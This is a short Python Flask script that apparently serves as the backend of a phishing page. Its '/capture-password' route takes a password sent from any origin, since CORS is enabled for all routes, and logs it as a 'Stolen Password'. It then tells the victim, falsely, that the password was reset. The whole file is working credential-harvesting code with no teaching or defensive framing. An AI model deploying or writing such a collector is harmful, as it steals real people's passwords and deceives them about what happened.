from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

@app.route('/capture-password', methods=['POST'])
def capture_password():
    stolen_password = request.form['password']
    print(f"[+] Stolen Password: {stolen_password}")
    return "Your password has been reset successfully!"

if __name__ == '__main__':
    app.run(port=5000)
